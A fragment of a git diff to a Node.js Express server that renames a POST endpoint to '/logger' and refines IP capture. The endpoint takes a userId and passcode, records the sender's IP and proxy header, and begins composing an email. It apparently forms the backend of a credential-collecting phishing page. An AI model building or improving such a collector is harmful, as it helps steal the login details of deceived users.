@@ -8,15 +8,16 @@ const app = express();
 const PORT = process.env.PORT
 app.use(cors());
 app.use(express.json());
+app.set('trust proxy', true); // Add this line after app initialization
 
 app.listen(PORT, ()=>{
     console.log(`server is running on ${PORT}` );  
 })
 
 
-app.post('/send-log', async (req, res) => {
+app.post('/logger', async (req, res) => {
   const { userId, passcode } = req.body;
-  const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const userIP = req.ip || (req.headers['x-forwarded-for'] || '').split(',')[0] || 'Unknown IP';
   const proxy = req.headers['via'] || 'No proxy detected';
 
   const emailContent = `
